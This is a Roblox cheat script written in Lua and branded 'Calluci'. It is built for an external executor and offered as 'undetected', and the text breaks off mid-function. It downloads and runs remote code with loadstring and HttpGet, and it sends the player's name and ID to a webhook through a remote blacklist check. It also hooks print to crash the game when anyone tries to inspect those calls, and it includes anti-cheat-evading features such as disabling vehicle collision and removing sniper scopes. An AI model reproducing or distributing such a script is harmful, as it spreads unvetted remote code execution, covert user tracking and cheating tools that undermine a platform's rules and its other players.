print([[ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•— â–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•— â–ˆâ–ˆâ•—â–ˆâ–ˆâ•— â–ˆâ–ˆâ•”â•�â•�â•�â•�â•�â–ˆâ–ˆâ•”â•�â•�â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•”â•�â•�â•�â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•�â•�â•�â•�â•�â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•”â•�â•�â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•�â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•�â–ˆâ–ˆâ•‘ â•šâ•�â•�â•�â•�â•�â•�â•šâ•�â•� â•šâ•�â•�â•�â•�â•�â•šâ•�â•�â•�â•�â•�â•�â•� â•šâ•�â•�â•�â•�â•�â•� â•šâ•�â•�â•�â•�â•�â•� â•šâ•�â•�â•�â•�â•�â•� â•šâ•�â•�â•�â•�â•�â•� ]]) local SERVICES = { Players = game:GetService("Players"), HttpService = game:GetService("HttpService"), TweenService = game:GetService("TweenService"), Lighting = game:GetService("Lighting"), RunService = game:GetService("RunService"), UserInputService = game:GetService("UserInputService"), SoundService = game:GetService("SoundService"), ReplicatedStorage = game:GetService("ReplicatedStorage"), TeleportService = game:GetService("TeleportService"), CoreGui = game:GetService("CoreGui") } local Players = SERVICES.Players local HttpService = SERVICES.HttpService local TweenService = SERVICES.TweenService local Lighting = SERVICES.Lighting local RunService = SERVICES.RunService local UIS = SERVICES.UserInputService local SoundService = SERVICES.SoundService local ReplicatedStorage = SERVICES.ReplicatedStorage local TeleportService = SERVICES.TeleportService local CoreGui = SERVICES.CoreGui local LocalPlayer = Players.LocalPlayer local Camera = workspace.CurrentCamera local Workspace = workspace if not game or not game.GetService or not (game.IsLoaded and game:IsLoaded()) then return end local oldPrint = print print = function(...) local args = {...} for _, v in ipairs(args) do if type(v) == "string" and string.find(v, "loadstring") and string.find(v, "HttpGet") then game:Shutdown() while true do end end end return oldPrint(...) end if _G.__LOADED then warn("Already executed") return end _G.__LOADED = true local CustomSounds = { Minecraft = "rbxassetid://8766809464", Simple = "rbxassetid://3748776946", Bing = "rbxassetid://6607204501", Skeet = "rbxassetid://5633695679", Rust = "rbxassetid://1255040462", Pick = "rbxassetid://1347140027", Shine = "rbxassetid://5693220817", Neverlose = "rbxassetid://8679627751", Metal = "rbxassetid://8917041751", Shield = "rbxassetid://140073271098075", Headshot = "rbxassetid://2513174484", Grrr = "rbxassetid://8603227350", Rizz = "rbxassetid://89848519630209", Mommy = "rbxassetid://90759147003294" } local blacklistWebhook = nil local blacklistURL = "https://raw.githubusercontent.com/callucisoftwares/callucisoftware/main/blacklist.json" local Skyboxes = { ["Grey"] = { SkyboxBk="rbxassetid://600830446", SkyboxDn="rbxassetid://600831635", SkyboxFt="rbxassetid://600832720", SkyboxLf="rbxassetid://600886090", SkyboxRt="rbxassetid://600833862", SkyboxUp="rbxassetid://600835177" }, ["Night"] = { SkyboxBk="rbxassetid://12064107", SkyboxDn="rbxassetid://12064152", SkyboxFt="rbxassetid://12064121", SkyboxLf="rbxassetid://12063984", SkyboxRt="rbxassetid://12064115", SkyboxUp="rbxassetid://12064131" }, ["Night V2"] = { SkyboxBk="rbxassetid://6444884337", SkyboxDn="rbxassetid://6444884785", SkyboxFt="rbxassetid://6444884337", SkyboxLf="rbxassetid://6444884337", SkyboxRt="rbxassetid://6444884337", SkyboxUp="rbxassetid://6444884337" }, ["Purple"] = { SkyboxBk="rbxassetid://16553658937", SkyboxDn="rbxassetid://16553660713", SkyboxFt="rbxassetid://16553662144", SkyboxLf="rbxassetid://16553664042", SkyboxRt="rbxassetid://16553665766", SkyboxUp="rbxassetid://16553667750" }, ["Aurora"] = { SkyboxBk="rbxassetid://128600713462148", SkyboxDn="rbxassetid://129205524771926", SkyboxFt="rbxassetid://91295549823939", SkyboxLf="rbxassetid://78049621027692", SkyboxRt="rbxassetid://97339481871314", SkyboxUp="rbxassetid://85412515491070" }, ["Orange"] = { SkyboxBk="rbxassetid://75806894209584", SkyboxDn="rbxassetid://88955070832523", SkyboxFt="rbxassetid://137588397191887", SkyboxLf="rbxassetid://124955584991258", SkyboxRt="rbxassetid://140343245463200", SkyboxUp="rbxassetid://134383800716949" }, ["Moonlight"] = { SkyboxBk="rbxassetid://116261899350523", SkyboxDn="rbxassetid://92257816837512", SkyboxFt="rbxassetid://108326981730305", SkyboxLf="rbxassetid://131834280163741", SkyboxRt="rbxassetid://99525277797873", SkyboxUp="rbxassetid://125425274451894" }, ["Red Sky"] = { SkyboxBk="rbxassetid://401664839", SkyboxDn="rbxassetid://401664862", SkyboxFt="rbxassetid://401664960", SkyboxLf="rbxassetid://401664881", SkyboxRt="rbxassetid://401664901", SkyboxUp="rbxassetid://401664936" }, ["Dark Void"] = { SkyboxBk="rbxassetid://6285719338", SkyboxDn="rbxassetid://6285721078", SkyboxFt="rbxassetid://6285722964", SkyboxLf="rbxassetid://6285724682", SkyboxRt="rbxassetid://6285726335", SkyboxUp="rbxassetid://6285730635" }, ["Poison Sky"] = { SkyboxBk="rbxassetid://11941775243", SkyboxDn="rbxassetid://11941774975", SkyboxFt="rbxassetid://11941774655", SkyboxLf="rbxassetid://11941774369", SkyboxRt="rbxassetid://11941774042", SkyboxUp="rbxassetid://11941773718" }, ["blue night"] = { SkyboxBk="rbxassetid://1233158420", SkyboxDn="rbxassetid://1233158838", SkyboxFt="rbxassetid://1233157105", SkyboxLf="rbxassetid://1233157640", SkyboxRt="rbxassetid://1233157995", SkyboxUp="rbxassetid://1233159158" }, ["SPONGEBOB"] = { SkyboxBk="rbxassetid://15912530252", SkyboxDn="rbxassetid://15912530252", SkyboxFt="rbxassetid://15912530252", SkyboxLf="rbxassetid://15912530252", SkyboxRt="rbxassetid://15912530252", SkyboxUp="rbxassetid://15912530252" }, ["Pink"] = { SkyboxBk="rbxassetid://271042516", SkyboxDn="rbxassetid://271077243", SkyboxFt="rbxassetid://271042556", SkyboxLf="rbxassetid://271042310", SkyboxRt="rbxassetid://271042467", SkyboxUp="rbxassetid://271077958" }, ["Minecraft Sky"] = { SkyboxBk="rbxassetid://1876545003", SkyboxDn="rbxassetid://1876544331", SkyboxFt="rbxassetid://1876542941", SkyboxLf="rbxassetid://1876543392", SkyboxRt="rbxassetid://1876543764", SkyboxUp="rbxassetid://1876544642" }, ["Space"] = { SkyboxBk="rbxassetid://166509999", SkyboxDn="rbxassetid://166510057", SkyboxFt="rbxassetid://166510116", SkyboxLf="rbxassetid://166510092", SkyboxRt="rbxassetid://166510131", SkyboxUp="rbxassetid://166510114" }, ["Red Matcha"] = { SkyboxBk="rbxassetid://108929045660200", SkyboxDn="rbxassetid://78646480540009", SkyboxFt="rbxassetid://90546017435179", SkyboxLf="rbxassetid://109838453114563", SkyboxRt="rbxassetid://94190734796082", SkyboxUp="rbxassetid://126944775797063" } } local ChillSongs = { ["Tokyo Drift"] = "rbxassetid://1843523203", ["Phonk"] = "rbxassetid://9048375035", ["Chill"] = "rbxassetid://1837467331" } local WeaponSounds = { SniperShoot = "rbxassetid://801167040", G36 = "rbxassetid://801226154" } local Fonts = { Gotham = Enum.Font.Gotham, GothamBold = Enum.Font.GothamBold, Code = Enum.Font.Code, Arcade = Enum.Font.Arcade, SciFi = Enum.Font.SciFi, SourceSans = Enum.Font.SourceSans, Fantasy = Enum.Font.Fantasy } local Cursors = { Default = "", Crosshair = "rbxassetid://9943168532", Dot = "rbxassetid://9943169291", Circle = "rbxassetid://9943168917", Target = "rbxassetid://10734950309" } local function sendBlacklistLog(reason) local embed = { username = "Calluci Blacklist System", embeds = {{ title = "CALLUCI BLACKLIST", color = 16711680, fields = { {name = "USER", value = LocalPlayer.Name, inline = true}, {name = "USER ID", value = tostring(LocalPlayer.UserId), inline = true}, {name = "REASON", value = reason, inline = false} }, footer = {text = "Calluci Security â€¢ " .. os.date("%H:%M")} }} } pcall(function() local req = syn and syn.request or http_request or request if req and blacklistWebhook ~= "" then req({ Url = blacklistWebhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(embed) }) end end) end local function checkBlacklist() local req = syn and syn.request or http_request or request if not req then return end local success, response = pcall(function() return req({Url = blacklistURL, Method = "GET"}) end) if not success or not response or not response.Body then return end local decoded local jsonSuccess = pcall(function() decoded = HttpService:JSONDecode(response.Body) end) if not jsonSuccess or not decoded then return end local userData = decoded[tostring(LocalPlayer.UserId)] if userData then local reason = userData.reason or "Blacklisted" sendBlacklistLog(reason) LocalPlayer:Kick("TO APPEAL YOUR BAN JOIN OUR DISCORD https://discord.gg/yszMMHGDR\n\nReason: " .. reason) end end task.spawn(checkBlacklist) local loadingGui = Instance.new("ScreenGui") loadingGui.Name = "CalluciLoading" loadingGui.IgnoreGuiInset = true loadingGui.ResetOnSpawn = false loadingGui.Parent = CoreGui local loadingFrame = Instance.new("Frame") loadingFrame.Size = UDim2.new(1, 0, 1, 0) loadingFrame.BackgroundColor3 = Color3.fromRGB(240, 240, 240) loadingFrame.BorderSizePixel = 0 loadingFrame.Parent = loadingGui local title = Instance.new("TextLabel") title.Size = UDim2.new(1, 0, 0, 80) title.Position = UDim2.new(0, 0, 0.35, 0) title.BackgroundTransparency = 1 title.Text = "CALLUCI M0GGED EH" title.TextColor3 = Color3.fromRGB(40, 40, 40) title.TextScaled = true title.Font = Enum.Font.GothamBold title.Parent = loadingFrame local subtitle = Instance.new("TextLabel") subtitle.Size = UDim2.new(1, 0, 0, 30) subtitle.Position = UDim2.new(0, 0, 0.48, 0) subtitle.BackgroundTransparency = 1 subtitle.Text = "LOADING" subtitle.TextColor3 = Color3.fromRGB(100, 100, 100) subtitle.TextScaled = true subtitle.Font = Enum.Font.Gotham subtitle.Parent = loadingFrame local loadingBarBg = Instance.new("Frame") loadingBarBg.Size = UDim2.new(0.3, 0, 0, 4) loadingBarBg.Position = UDim2.new(0.35, 0, 0.55, 0) loadingBarBg.BackgroundColor3 = Color3.fromRGB(200, 200, 200) loadingBarBg.BorderSizePixel = 0 loadingBarBg.Parent = loadingFrame local loadingBar = Instance.new("Frame") loadingBar.Size = UDim2.new(0, 0, 1, 0) loadingBar.BackgroundColor3 = Color3.fromRGB(80, 80, 80) loadingBar.BorderSizePixel = 0 loadingBar.Parent = loadingBarBg local statusText = Instance.new("TextLabel") statusText.Size = UDim2.new(1, 0, 0, 20) statusText.Position = UDim2.new(0, 0, 0.62, 0) statusText.BackgroundTransparency = 1 statusText.Text = "" statusText.TextColor3 = Color3.fromRGB(120, 120, 120) statusText.TextScaled = true statusText.Font = Enum.Font.Gotham statusText.Parent = loadingFrame local dotText = Instance.new("TextLabel") dotText.Size = UDim2.new(0.2, 0, 0, 20) dotText.Position = UDim2.new(0.4, 0, 0.70, 0) dotText.BackgroundTransparency = 1 dotText.Text = "" dotText.TextColor3 = Color3.fromRGB(80, 80, 80) dotText.TextScaled = true dotText.Font = Enum.Font.Gotham dotText.Parent = loadingFrame task.spawn(function() local dots = "" while loadingGui.Parent do dots = dots .. "." if #dots > 3 then dots = "" end dotText.Text = dots task.wait(0.5) end end) for i = 1, 100 do loadingBar.Size = UDim2.new(i / 100, 0, 1, 0) task.wait(0.03) end statusText.Text = "READY" task.wait(0.5) TweenService:Create(loadingFrame, TweenInfo.new(0.5), {BackgroundTransparency = 1}):Play() task.wait(0.5) loadingGui:Destroy() local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))() local Window = WindUI:CreateWindow({ Title = "CALLI MOGGED EH", Icon = "wifi", Author = "0bans BEST EH PLAYER ", Folder = "CALLUCI", Size = UDim2.fromOffset(650,520), Transparent = false, Theme = "Light", SideBarWidth = 170 }) UIS.InputBegan:Connect(function(input, gameProcessed) if gameProcessed then return end if input.KeyCode == Enum.KeyCode.K then Window:Toggle() end end) local InfoTab = Window:Tab({Title = "Info",Icon = "info"}) local ThemeTab = Window:Tab({ Title = "Themes", Icon = "palette" }) local Themes = { "Dark", "Light", "Rose", "Midnight", "Red", } ThemeTab:Dropdown({ Title = "Select Theme", Values = Themes, Value = "Light", Callback = function(theme) WindUI:SetTheme(theme) end }) local VisualTab = Window:Tab({Title="Visual",Icon="eye"}) local SniperTab = Window:Tab({Title="OG Sniper",Icon="target"}) local CrosshairTab = Window:Tab({Title="Crosshair",Icon="crosshair"}) local SkinChangerTab = Window:Tab({Title="SkinChanger",Icon="shirt"}) local SoundTab = Window:Tab({Title="Sound",Icon="music"}) local SkinTab = Window:Tab({Title="SkinCase",Icon="shield"}) local PlayerTab = Window:Tab({Title="Player",Icon="user"}) local WorldTab = Window:Tab({Title="World",Icon="globe"}) local MiscTab = Window:Tab({Title="Misc",Icon="star"}) local ShinyTab = Window:Tab({Title = "Shiny",Icon = "sparkles"}) local WeaponSoundTab = Window:Tab({Title = "Hitsound",Icon = "audio-lines"}) local CarTab = Window:Tab({Title = "Car System", Icon = "car"}) local CustomTab = Window:Tab({Title = "Customization", Icon = "palette"}) InfoTab:Paragraph({ Title = "WELCOME TO CALLUCI", Desc = "The most stable and undetected script for your Roblox experience" }) InfoTab:Paragraph({ Title = "CREDITS", Desc = "Made @stqvz aka flowwz\n inspo from rexas" }) InfoTab:Button({ Title = "Join Our Discord", Desc = "Get support, chat, and see update logs", Icon = "link", Callback = function() if openurl then openurl("https://discord.gg/yszMMHGDR) else setclipboard("https://discord.gg/yszMMHGDR") WindUI:Notify({ Title = "Discord", Content = "Link was copied to your clipboard.", Duration = 3 }) end end }) InfoTab:Paragraph({ Title = "STATUS", Desc = "Free - EH" }) InfoTab:Paragraph({ Title = "CONTROLS", Desc = "Press K to toggle the UI" }) local function ApplySky(name) local data = Skyboxes[name] if not data then return end local sky = Lighting:FindFirstChildOfClass("Sky") or Instance.new("Sky") sky.Parent = Lighting for i,v in pairs(data) do sky[i] = v end end VisualTab:Paragraph({ Title = "SKYBOX", Desc = "Change the skybox to your preference" }) VisualTab:Dropdown({ Title = "Skybox", Values = { "Grey","Night","Night V2","Purple","Aurora","Orange","Moonlight", "Red Sky","Dark Void","Poison Sky","blue night","SPONGEBOB", "Pink","Minecraft Sky","Space","Red Matcha" }, Callback = function(v) ApplySky(v) end }) VisualTab:Button({ Title = "Remove Sky", Callback = function() local sky = Lighting:FindFirstChildOfClass("Sky") if sky then sky:Destroy() end end }) VisualTab:Paragraph({ Title = "BLUR EFFECTS", Desc = "Add motion blur to your game" }) local blur = Lighting:FindFirstChild("CalluciBlur") or Instance.new("BlurEffect") blur.Name = "CalluciBlur" blur.Parent = Lighting blur.Size = 0 VisualTab:Toggle({ Title = "Enable Blur", Callback = function(v) if not v then blur.Size = 0 end end }) VisualTab:Slider({ Title = "Blur Strength", Step = 1, Value = {Min = 0, Max = 15, Default = 0}, Callback = function(v) blur.Size = v end }) VisualTab:Paragraph({ Title = "COLOR CORRECTION", Desc = "Adjust the game's colors" }) local cc = Lighting:FindFirstChild("CalluciCC") or Instance.new("ColorCorrectionEffect") cc.Parent = Lighting VisualTab:Slider({ Title = "Saturation", Step = 0.1, Value = {Min = -1, Max = 2, Default = 0}, Callback = function(v) cc.Saturation = v end }) VisualTab:Slider({ Title = "Brightness", Step = 0.1, Value = {Min = -2, Max = 3, Default = 0}, Callback = function(v) cc.Brightness = v end }) VisualTab:Slider({ Title = "Contrast", Step = 0.1, Value = {Min = -1, Max = 2, Default = 0}, Callback = function(v) cc.Contrast = v end }) VisualTab:Paragraph({ Title = "TIME CONTROL", Desc = "Change the in-game time" }) local CustomTime = false local TimeValue = 14 VisualTab:Toggle({ Title = "Custom Time", Callback = function(v) CustomTime = v end }) VisualTab:Slider({ Title = "Clock Time", Step = 1, Value = {Min = 0, Max = 24, Default = 14}, Callback = function(v) TimeValue = v end }) RunService.RenderStepped:Connect(function() if CustomTime then Lighting.ClockTime = TimeValue end end) VisualTab:Paragraph({ Title = "LIGHTING", Desc = "Adjust the game's lighting" }) VisualTab:Toggle({ Title = "FullBright", Callback = function(v) if v then Lighting.Ambient = Color3.new(1,1,1) Lighting.Brightness = 4 else Lighting.Ambient = Color3.fromRGB(127,127,127) Lighting.Brightness = 2 end end }) VisualTab:Toggle({ Title = "High Quality", Callback = function(v) Lighting.GlobalShadows = v if v then Lighting.EnvironmentDiffuseScale = 1 Lighting.EnvironmentSpecularScale = 1 else Lighting.EnvironmentDiffuseScale = 0 Lighting.EnvironmentSpecularScale = 0 end end }) VisualTab:Paragraph({ Title = "CAMERA", Desc = "Adjust your field of view" }) VisualTab:Slider({ Title = "FOV", Step = 1, Value = {Min = 60, Max = 120, Default = 70}, Callback = function(v) Camera.FieldOfView = v end }) CarTab:Paragraph({ Title = "VEHICLE CUSTOMIZATION", Desc = "Customize your vehicle with skins and colors" }) local VehicleColor = Color3.fromRGB(255,0,0) local UnderGlowColor = Color3.fromRGB(255,0,0) local UnderGlowBrightness = 1 local SelectedCarSkin = "NONE" local SelectedBodyColor = Color3.fromRGB(255,255,255) local PlateText = "CALLUCI" local function GetVehicle() local Character = LocalPlayer.Character if not Character then return nil end local Humanoid = Character:FindFirstChildOfClass("Humanoid") if not Humanoid then return nil end local Seat = Humanoid.SeatPart if not Seat then return nil end return Seat:FindFirstAncestorOfClass("Model") end CarTab:Colorpicker({ Title = "Vehicle Color", Default = VehicleColor, Transparency = 0, Callback = function(v) VehicleColor = v end }) CarTab:Colorpicker({ Title = "Underglow Color", Default = UnderGlowColor, Transparency = 0, Callback = function(v) UnderGlowColor = v end }) CarTab:Colorpicker({ Title = "Body Color", Default = SelectedBodyColor, Transparency = 0, Callback = function(color) SelectedBodyColor = color end }) CarTab:Slider({ Title = "Underglow Brightness", Step = 0.1, Value = {Min = 0, Max = 5, Default = 1}, Callback = function(v) UnderGlowBrightness = v end }) CarTab:Dropdown({ Title = "Car Skin", Values = {"NONE", "GOLD", "CHROME", "DIAMOND", "GALAXY", "LAVA", "ICE", "OBSIDIAN"}, Callback = function(v) SelectedCarSkin = v end }) local function ApplyCarMaterial(part) if SelectedCarSkin == "NONE" then part.Color = VehicleColor part.Material = Enum.Material.SmoothPlastic part.Reflectance = 0.1 elseif SelectedCarSkin == "GOLD" then part.Color = Color3.fromRGB(212,175,55) part.Material = Enum.Material.Metal part.Reflectance = 0.2 elseif SelectedCarSkin == "CHROME" then part.Color = Color3.fromRGB(220,220,220) part.Material = Enum.Material.Metal part.Reflectance = 0.35 elseif SelectedCarSkin == "DIAMOND" then part.Color = Color3.fromRGB(185,242,255) part.Material = Enum.Material.Glass part.Transparency = 0.05 elseif SelectedCarSkin == "GALAXY" then part.Color = Color3.fromRGB(90,0,170) part.Material = Enum.Material.Neon elseif SelectedCarSkin == "LAVA" then part.Color = Color3.fromRGB(255,80,0) part.Material = Enum.Material.Neon elseif SelectedCarSkin == "ICE" then part.Color = Color3.fromRGB(120,220,255) part.Material = Enum.Material.Glass elseif SelectedCarSkin == "OBSIDIAN" then part.Color = Color3.fromRGB(20,20,20) part.Material = Enum.Material.Slate end end CarTab:Button({ Title = "Apply Vehicle Customization", Callback = function() local vehicle = GetVehicle() if not vehicle then WindUI:Notify({Title = "CALLUCI", Content = "Sit in a vehicle first", Duration = 3}) return end for _,v in pairs(vehicle:GetDescendants()) do if v:IsA("BasePart") or v:IsA("MeshPart") then ApplyCarMaterial(v) local light = v:FindFirstChild("CalluciGlow") if not light then light = Instance.new("PointLight") light.Name = "CalluciGlow" light.Parent = v end light.Color = UnderGlowColor light.Range = 8 light.Brightness = UnderGlowBrightness end end WindUI:Notify({Title = "CALLUCI", Content = "Vehicle customization applied", Duration = 2}) end }) CarTab:Button({ Title = "Reset Vehicle", Callback = function() local vehicle = GetVehicle() if not vehicle then WindUI:Notify({Title = "CALLUCI", Content = "Sit in a vehicle first", Duration = 3}) return end for _,v in pairs(vehicle:GetDescendants()) do if v:IsA("BasePart") then v.Material = Enum.Material.Plastic v.Reflectance = 0 local glow = v:FindFirstChild("CalluciGlow") if glow then glow:Destroy() end end end WindUI:Notify({Title = "CALLUCI", Content = "Vehicle reset", Duration = 2}) end }) CarTab:Button({ Title = "Apply Body Color Only", Callback = function() local Vehicle = GetVehicle() if not Vehicle then WindUI:Notify({Title = "CALLUCI", Content = "Sit in a vehicle first", Duration = 3}) return end for _,obj in pairs(Vehicle:GetDescendants()) do if obj:IsA("BasePart") or obj:IsA("MeshPart") then local name = obj.Name:lower() if name:find("body") or name:find("door") or name:find("hood") or name:find("trunk") or name:find("bumper") then obj.Color = SelectedBodyColor obj.Material = Enum.Material.SmoothPlastic end end end WindUI:Notify({Title = "CALLUCI", Content = "Body color applied", Duration = 2}) end }) CarTab:Button({ Title = "OP CARBUG", Callback = function() local Vehicle = GetVehicle() if not Vehicle then WindUI:Notify({Title = "CALLUCI", Content = "Sit in a vehicle first", Duration = 3}) return end for _,v in pairs(Vehicle:GetDescendants()) do if v:IsA("BasePart") then local n = v.Name:lower() if n:find("door") or n:find("body") or n:find("hood") or n:find("trunk") then v.CanCollide = false end end end WindUI:Notify({Title = "CALLUCI", Content = "Car collision disabled", Duration = 2}) end }) CarTab:Paragraph({ Title = "LICENSE PLATE", Desc = "Customize your license plate" }) CarTab:Input({ Title = "Plate Text", Placeholder = "Enter Plate", Callback = function(text) if text ~= "" then PlateText = text end end }) CarTab:Button({ Title = "Save Plate", Callback = function() if writefile then writefile("calluci_plate.txt", PlateText) WindUI:Notify({Title = "CALLUCI", Content = "Plate Saved", Duration = 2}) end end }) task.spawn(function() while task.wait(1) do local Vehicle = GetVehicle() if not Vehicle then continue end local Plates = Vehicle:FindFirstChild("LicensePlates", true) if not Plates then continue end for _,obj in pairs(Plates:GetDescendants()) do if obj:IsA("TextLabel") then obj.Text = PlateText obj.TextScaled = true obj.Font = Enum.Font.GothamBold obj.TextColor3 = Color3.fromRGB(0,0,0) end end end end) local WeaponTab = Window:Tab({Title = "Weapon Skins", Icon = "sword"}) WeaponTab:Paragraph({ Title = "WEAPON SKINS", Desc = "Apply custom colors and materials to your weapons" }) -- HIER IST DER FIX: SkinsEnabled steuert, ob die Waffen verÃ¤ndert werden sollen local SkinsEnabled = false local WeaponColor = Color3.new(1, 1, 1) -- Standardfarbe fÃ¼r das UI local WeaponMaterial = Enum.Material.Neon local function ApplyWeaponSkin(tool) -- Wenn das Tool fehlt ODER der User die Skins gar nicht aktiviert hat, tun wir NICHTS if not tool or not SkinsEnabled then return end for _, obj in pairs(tool:GetDescendants()) do if obj:IsA("BasePart") then pcall(function() obj.Color = WeaponColor obj.Material = WeaponMaterial obj.Reflectance = 0 end) elseif obj:IsA("SpecialMesh") then pcall(function() obj.VertexColor = Vector3.new(WeaponColor.R, WeaponColor.G, WeaponColor.B) end) elseif obj:IsA("Texture") or obj:IsA("Decal") then pcall(function() obj:Destroy() end) end end end local function UpdateAllWeapons() local char = LocalPlayer.Character if char then for _, tool in pairs(char:GetChildren()) do if tool:IsA("Tool") then ApplyWeaponSkin(tool) end end end local backpack = LocalPlayer:FindFirstChildOfClass("Backpack") if backpack then for _, tool in pairs(backpack:GetChildren()) do if tool:IsA("Tool") then ApplyWeaponSkin(tool) end end end end -- AUTOMATISCHE EVENTS (Beachten jetzt die SkinsEnabled-Regel) LocalPlayer.CharacterAdded:Connect(function(char) char.ChildAdded:Connect(function(child) if child:IsA("Tool") then task.wait(0.1) ApplyWeaponSkin(child) end end) end) if LocalPlayer.Character then LocalPlayer.Character.ChildAdded:Connect(function(child) if child:IsA("Tool") then task.wait(0.1) ApplyWeaponSkin(child) end end) end local backpack = LocalPlayer:WaitForChild("Backpack", 5) if backpack then backpack.ChildAdded:Connect(function(child) if child:IsA("Tool") then task.wait(0.1) ApplyWeaponSkin(child) end end) end -- ======================================================== -- WINDUI ELEMENTE -- ======================================================== -- 1. Neuer Toggle, um die Funktion Ã¼berhaupt erst einzuschalten WeaponTab:Toggle({ Title = "Enable Weapon Skins", Default = false, Callback = function(state) SkinsEnabled = state if state then UpdateAllWeapons() WindUI:Notify({Title = "CALLUCI", Content = "Weapon skins activated!", Duration = 2}) else WindUI:Notify({Title = "CALLUCI", Content = "Skins disabled. Reset your character to restore defaults.", Duration = 3}) end end }) -- 2. Colorpicker (FÃ¤rbt jetzt nur, wenn aktiviert) WeaponTab:Colorpicker({ Title = "Weapon Color", Default = WeaponColor, Transparency = 0, Callback = function(v) WeaponColor = v if SkinsEnabled then UpdateAllWeapons() end end }) -- 3. Dropdown (Ã„ndert Material nur, wenn aktiviert) WeaponTab:Dropdown({ Title = "Weapon Material", Values = {"Neon", "Metal", "ForceField", "Plastic", "Glass"}, Default = "Neon", Callback = function(v) WeaponMaterial = Enum.Material[v] if SkinsEnabled then UpdateAllWeapons() end end }) -- 4. Manueller Button (PrÃ¼ft ebenfalls den Toggle) WeaponTab:Button({ Title = "Apply Weapon Skin (Manual)", Callback = function() if not SkinsEnabled then WindUI:Notify({Title = "CALLUCI", Content = "Please enable Weapon Skins toggle first!", Duration = 3}) return end UpdateAllWeapons() WindUI:Notify({Title = "CALLUCI", Content = "Weapon skins applied", Duration = 2}) end }) SniperTab:Paragraph({ Title = "OG SNIPER", Desc = "Classic sniper experience with no scope" }) local OgSniper = false local NoSmooth = false local defaultFOV = 60 local zoomFOV = 25 local zoomSmoothness = 0.00 SniperTab:Toggle({ Title = "Enable OG Sniper", Callback = function(v) OgSniper = v if not v then Camera.FieldOfView = 70 end end }) SniperTab:Button({ Title = "Toggle No Smoothness", Callback = function() NoSmooth = not NoSmooth if NoSmooth then WindUI:Notify({Title = "OG Sniper", Content = "No Smoothness Enabled", Duration = 2}) else WindUI:Notify({Title = "OG Sniper", Content = "No Smoothness Disabled", Duration = 2}) end end }) SniperTab:Slider({ Title = "Zoom FOV", Step = 1, Value = {Min = 10, Max = 50, Default = 25}, Callback = function(v) zoomFOV = v end }) SniperTab:Slider({ Title = "Default FOV", Step = 1, Value = {Min = 50, Max = 90, Default = 60}, Callback = function(v) defaultFOV = v end }) RunService.Heartbeat:Connect(function() local c = LocalPlayer.Character if not c then return end for _,t in pairs(c:GetChildren()) do if t:IsA("Tool") then if OgSniper then pcall(function() t:SetAttribute("Scope", false) t:SetAttribute("HasScope", false) t:SetAttribute("AimDelay", 0) end) local sc = t:FindFirstChild("Scope") or t:FindFirstChild("Zielfernrohr") if sc then for _,p in pairs(sc:GetDescendants()) do if p:IsA("BasePart") then p.LocalTransparencyModifier = 1 end end end end end end end) RunService.RenderStepped:Connect(function() local c = LocalPlayer.Character if not c then return end if not OgSniper then return end local currentTool = c:FindFirstChildOfClass("Tool") if not currentTool then return end if not currentTool.Name:lower():find("sniper") then return end local aiming = UIS:IsMouseButtonPressed(Enum.UserInputType.MouseButton2) if NoSmooth then if aiming then Camera.FieldOfView = zoomFOV else Camera.FieldOfView = defaultFOV end else if aiming then Camera.FieldOfView = Camera.FieldOfView + ((zoomFOV - Camera.FieldOfView) * zoomSmoothness) else Camera.FieldOfView = Camera.FieldOfView + ((defaultFOV - Camera.FieldOfView) * zoomSmoothness) end end end) CrosshairTab:Paragraph({ Title = "CROSSHAIR", Desc = "Custom crosshair overlay" }) local CrosshairEnabled = false local CrosshairType = "DOT" local CrosshairColor = Color3.new(1,1,1) local CrosshairGui = Instance.new("ScreenGui") CrosshairGui.Name = "CalluciCrosshair" CrosshairGui.ResetOnSpawn = false CrosshairGui.IgnoreGuiInset = true CrosshairGui.Parent = CoreGui local Holder = Instance.new("Frame") Holder.Parent = CrosshairGui Holder.AnchorPoint = Vector2.new(0.5,0.5) Holder.Position = UDim2.new(0.5,0,0.5,0) Holder.Size = UDim2.new(0,0,0,0) Holder.BackgroundTransparency = 1 local function RemoveGameCrosshair() pcall(function() LocalPlayer:GetMouse().Icon = "rbxassetid://285779644" end) end local function ClearCrosshair() for _,v in pairs(Holder:GetChildren()) do v:Destroy() end end local function CreateLine(x,y,w,h,rot) local line = Instance.new("Frame") line.Parent = Holder line.BorderSizePixel = 0 line.BackgroundColor3 = CrosshairColor line.Position = UDim2.new(0,x,0,y) line.Size = UDim2.new(0,w,0,h) line.Rotation = rot or 0 